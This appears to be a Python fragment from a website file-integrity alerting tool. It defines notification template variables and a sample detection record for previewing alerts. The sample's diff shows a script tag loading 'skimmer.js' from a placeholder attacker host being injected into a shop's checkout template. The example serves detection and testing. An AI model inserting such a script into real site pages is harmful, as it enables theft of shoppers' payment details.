_REQUIRED_VARS: dict[str, set[str]] = {
    "subject": set(),  # built-in subject does not use $hostname; no required vars
    "email":   {"hostname", "detected_at", "file_count", "file_blocks"},
    "slack":   {"hostname", "detected_at", "file_count", "file_blocks"},
}

_SAMPLE_DETECTIONS = [
    {
        "path": "app/template/default/Shopping/index.twig",
        "full_path": "/var/www/html/app/template/default/Shopping/index.twig",
        "root_path": "/var/www/html",
        "git_status": "M",
        "diff": (
            "--- a/app/template/default/Shopping/index.twig\n"
            "+++ b/app/template/default/Shopping/index.twig\n"
            "@@ -1,3 +1,4 @@\n"
            " {% extends 'default_frame.twig' %}\n"
            "+<script src='https://evil.example.com/skimmer.js'></script>\n"
            " {% block main %}"
        ),
        "mtime": "2026-05-17 09:12:00 JST",
        "sha256": "deadbeef" * 8,
    }
]
